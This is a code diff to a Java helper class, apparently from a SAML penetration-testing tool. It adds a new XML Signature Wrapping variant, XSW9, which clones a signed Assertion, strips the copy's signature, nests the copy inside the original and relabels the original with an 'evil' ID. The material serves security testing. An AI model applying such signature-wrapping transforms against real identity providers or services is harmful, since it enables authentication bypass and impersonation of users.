@@ -10,13 +10,14 @@ import org.w3c.dom.Element;
 
 public class XSWHelpers {
 
-	public final static String[] xswTypes = {"XSW1", "XSW2", "XSW3", "XSW4", "XSW5", "XSW6", "XSW7", "XSW8"};
+	public final static String[] xswTypes = {"XSW1", "XSW2", "XSW3", "XSW4", "XSW5", "XSW6", "XSW7", "XSW8", "XSW9"};
 	
 	/*
 	 * Following are the 8 common XML Signature Wrapping attacks implemented, which were found
 	 * in a paper called "On Breaking SAML: Be Whoever You Want to Be"
 	 * We have also documented these attacks in our product documentation for further information
 	 * 
+	 * XSW9 is a new variant not based on the paper.
 	 * */
 	
 	public void applyXSW(String xswType, Document document){
@@ -44,6 +45,9 @@ public class XSWHelpers {
 				break;
 			case "XSW8":
 				applyXSW8(document);
+				break;
+			case "XSW9":
+				applyXSW9(document);
 				break;
 		}
 	}
@@ -126,6 +130,15 @@ public class XSWHelpers {
 		Element object = document.createElement("Object");
 		originalSignature.appendChild(object);
 		object.appendChild(assertion);
+	}
+
+	public void applyXSW9(Document document){
+		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
+		Element assertion = (Element) evilAssertion.cloneNode(true);
+		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
+		evilAssertion.appendChild(assertion);
+		assertion.removeChild(copiedSignature);
+		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
 	}
 	
 	public String diffLineMode(String text1, String text2) {
